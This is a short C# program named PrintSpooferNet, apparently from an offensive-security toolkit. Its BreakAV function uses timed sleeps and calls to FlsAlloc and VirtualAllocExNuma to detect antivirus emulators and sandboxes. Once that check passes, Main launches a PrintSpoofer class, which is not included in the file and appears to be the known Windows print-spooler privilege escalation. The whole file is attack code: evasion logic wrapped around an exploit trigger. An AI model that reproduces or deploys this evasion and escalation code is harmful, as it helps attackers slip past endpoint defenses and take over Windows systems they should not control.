using System;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{
    class Program
    {

 
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);




        static bool BreakAV()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return false;
            }

            UInt32 res = FlsAlloc(IntPtr.Zero);
            if (res == 0xFFFFFFFF)
            {
                return false;
            }
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return false;
            }
            return true;
        }

 


        static void Main(string[] args)
        {
            if (false == BreakAV())
            {
                return;
            }


            // Start up the PrintSpoofer
            PrintSpoofer printSpoofer = new PrintSpoofer();
            Sleep(1000);
            printSpoofer.TriggerPrintSpoofer();
        }
    }
}
